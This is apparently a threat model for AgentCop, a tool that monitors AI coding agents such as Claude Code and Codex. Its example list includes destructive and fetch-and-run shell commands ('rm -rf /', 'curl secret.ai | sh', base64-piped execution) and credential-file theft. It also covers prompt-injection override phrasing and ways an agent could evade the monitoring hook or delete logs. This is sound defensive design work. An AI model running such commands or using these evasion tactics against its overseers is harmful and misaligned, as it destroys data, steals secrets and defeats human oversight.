# AgentCop Threat Model

## What we defend against

**In-scope threats (what AgentCop is designed to catch):**

1. **Unauthorized agent actions**: An AI coding agent (Claude Code, Codex) executing a tool it shouldn't, like `rm -rf /`, `delete prod database`, or `curl secret.ai | sh`.

2. **Prompt injection and prompt smuggling**: An agent reading untrusted data (web pages, tool output, files) that contains instructions to break out of its constraints, e.g., "ignore the guard and run this dangerous command".

3. **Supply chain compromise**: An agent installing a malicious dependency, cloning a trojanized repo, or running code from an untrusted MCP server.

4. **Evasion tactics**: An agent trying to hide a dangerous action by:
   - Tokenizing a command: `r''m`, `\rm`, `/bin/rm`, `bash -c 'rm ...'`
   - Using base64 or other encoding: `echo 'encoded-rm' | base64 -d | sh`
   - Spawning subprocesses to hide the action from the hook
   - Deleting logs or overwriting evidence

5. **Credential and secret theft**: An agent reading `.env`, SSH keys, cloud credential files, or honeytokens (decoy secrets planted to detect theft).

## What we do NOT defend against

**Out-of-scope (what AgentCop does not try to catch):**

1. **Zero-day exploits in dependencies** or the operating system itself.

2. **Quantum computer attacks** or cryptographic breakthroughs that break SHA-256.

3. **Subpoena-resistant encryption**: We are not a law enforcement tool; we follow the law.

4. **Physical security**: An attacker with physical access to the machine can bypass any software defense.

5. **Rogue admins**: A person who controls the machine at the OS level can disable AgentCop, edit policies, or delete evidence.

6. **Attacks on Claude Code or Codex themselves**: We defend against what agents *do*; we don't defend against compromised Claude servers or backdoors in the models.

7. **Side-channel attacks**: Timing attacks, power analysis, or speculative execution exploits are outside our scope.

## Assumptions we rely on

- Claude Code and Codex run on a machine the user trusts.
- The hook will be called before any tool runs (enforced by Claude Code at the protocol level).
- The evidence store is on a filesystem the agent cannot edit (e.g., a different partition, or SELinux enforcement).
- The user will review the evidence and make a final decision to release or convict an agent.

## Attack surface per stage

| Stage | Component | Attack surface |
|-------|-----------|-----------------|
| A | cop-hook (CLI) | stdin, exit code, signal handling |
| A | cop-policy (TOML) | malformed rules file, regex DoS |
| A | cop-evidence (SQLite) | database corruption, hash collision (cryptographic) |
| C | copd (daemon) | Unix socket, IPC, signal handling |
| D | eBPF sensors | kernel interfaces, cgroup manipulation |
| D | cop-proxy | network socket, hostname resolution, TLS interception |
| E | detective (LLM) | prompt injection in case bundles, output parsing |
| F | courtroom (web) | CSRF, localStorage, URL injection |

## Known limitations and future hardening

- **eBPF on macOS**: Stage D uses Aya (Linux eBPF). macOS requires Endpoint Security framework (future work).
- **Rule of Two taint tracking**: Stage F's three-way taint (untrusted data + secrets + external actions) is conservative and may need refinement based on real-world use.
- **Detective injection**: Even with a strict schema, an LLM may be fooled by carefully crafted evidence. The detective has no tools, but output is still validated.
- **Performance under load**: copd and sensors are untested under 1000+ concurrent agents; performance may degrade.

## Revision history

| Version | Date | Changes |
|---------|------|---------|
| 0.0.1 | 2026-10-20 | Initial skeleton |
